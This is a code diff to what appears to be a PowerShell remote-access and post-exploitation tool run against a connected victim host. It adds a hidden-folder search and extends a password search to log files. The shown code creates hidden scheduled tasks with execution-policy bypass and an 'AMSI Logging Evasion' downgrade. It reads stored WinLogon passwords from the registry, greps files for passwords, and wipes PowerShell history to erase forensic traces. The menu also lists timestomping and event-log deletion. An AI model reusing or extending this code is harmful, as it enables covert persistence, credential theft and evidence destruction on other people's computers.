@@ -466,7 +466,7 @@ While($Client.Connected)
           write-host " - Input Remote Folder Path (`$env:tmp): " -NoNewline;
           $RfPath = Read-Host;Write-Host "`n`n";
           #$Command = "cd $final_path;cmd /c `"FOR /f `"tokens=*`" %G IN ('dir /A:D /b /s') DO cmd /c icacls `"%G`"|findstr /i `"Everyone`" `>`> %tmp%\WeakPrivs.txt`";Get-Content `$env:tmp\WeakPrivs.txt;Remove-Item `$env:tmp\WeakPrivs.txt -Force";
-          $Command = "icacls `"$RfPath\*`"|findstr `"Everyone`" `> WeakFP.txt;`$a = Get-Content WeakFP.txt|findstr `"Everyone`";If(`$a){Get-Content WeakFP.txt;remove-item WeakFP.txt -Force}else{echo `"   None Weak Folder Permissions Found (Everyone (I) (F) (W)) ..`" `> WeakFP.txt;Get-Content WeakFP.txt;remove-item WeakFP.txt -Force}";
+          $Command = "icacls `"$RfPath\*`"|findstr `"Everyone`" `> WeakFP.txt;`$a = Get-Content WeakFP.txt|findstr `"Everyone`";If(`$a){Get-Content WeakFP.txt;remove-item WeakFP.txt -Force}else{echo `"   None Weak Folder Permissions Found (Everyone (OI) (CI) (F)) ..`" `> WeakFP.txt;Get-Content WeakFP.txt;remove-item WeakFP.txt -Force}";
         }
         If($my_choise -eq "Service" -or $my_choise -eq "service")
         {
@@ -768,7 +768,8 @@ While($Client.Connected)
       write-host "   Restart   Restart in xx seconds           Restart Remote-Host with MsgBox";
       write-host "   ListLog   List/Delete EventLogs           Remote List/Delete eventvwr Logs";
       write-host "   SetMace   Change files date/time          Change Remote-Host Files TimeStomp";
-      write-host "   ListPas   Search remote passwords         Search stored passwords in txt Files";
+      write-host "   ListPas   Search remote passwords         Search stored passwords in txt|logs";
+      write-host "   ListDir   Search for hidden folders       Search for hidden folder recursive";
       write-host "   GoogleX   Open Google Sphere(prank)       Open Remote Browser in google sphere";
       write-host "   LockPC    Lock Remote WorkStation         Lock Remote workstation (rundll32)";
       write-host "   SpeakPC   Make Remote-Host Speak          Input Frase for Remote-Host to Speak";
@@ -838,7 +839,7 @@ While($Client.Connected)
           write-host "`n";
           ## Settings: ($stime == time-interval) | (/st 00:00 /du 0003:00 == 3 hours duration)
           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -version 2 -Execution Bypass -windowstyle hidden -NoProfile -File $execapi`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}else{cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -Execution Bypass -windowstyle hidden -NoProfile -File $execapi`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}}else{cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -Execution Bypass -windowstyle hidden -NoProfile -File $execapi`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}";
-        }
+        }    
         If($startup_choise -eq "WinLogon" -or $startup_choise -eq "logon")
         {
           ## If Available use powershell -version 2 {AMSI Logging Evasion}
@@ -961,6 +962,14 @@ While($Client.Connected)
         $Recursive_search = Read-Host;
         write-host " [warning] This Function Might Take aWhile To Complete .." -ForegroundColor red -BackGroundColor white;write-host "`n`n";
         $Command = "echo `"[WinLogon]`" `> `$env:tmp\passwd.txt;cmd /R reg query `"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`" /v DefaultUserName `>`> `$env:tmp\passwd.txt;cmd /R reg query `"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`" /v DefaultPassword `>`> `$env:tmp\passwd.txt;echo `"[List Passwords in Text|Log Files]`" `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /C:`"passwd`" *.txt *.log `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /C:`"password`" *.txt *.log `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /C:`"pass`" *.txt *.log `>`> `$env:tmp\passwd.txt;Get-Content `$env:tmp\passwd.txt;Remove-Item `$env:tmp\passwd.txt -Force;echo `"Forensic null factor`" `> `$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt;cd `$env:tmp";
+      }
+      If($choise -eq "ListDir" -or $choise -eq "dir")
+      {
+        write-host " List Hidden directorys recursive." -ForegroundColor Blue -BackgroundColor White;
+        write-host " - Directory to start search recursive (`$env:userprofile): " -NoNewLine;
+        $Recursive_search = Read-Host;
+        write-host " [warning] This Function Might Take aWhile To Complete .." -ForegroundColor red -BackGroundColor white;write-host "`n`n";
+        $Command = "Get-ChildItem -Hidden -Path $Recursive_search -Recurse -Force -ErrorAction SilentlyContinue  >` `$env:tmp\hidden.txt;Get-Content `$env:tmp\hidden.txt|Where-Object {`$_ -notmatch '.ini'}|Set-Content `$env:tmp\out.txt;Get-Content `$env:tmp\out.txt|Where-Object {`$_ -notmatch '.dat'}|Set-Content `$env:tmp\out2.txt;Get-Content `$env:tmp\out2.txt|Where-Object {`$_ -notmatch '.tmp'}|Set-Content `$env:tmp\out3.txt;Get-Content `$env:tmp\out3.txt;Remove-Item *.txt -Force";
       }
       If($choise -eq "SetMace" -or $choise -eq "mace")
       {
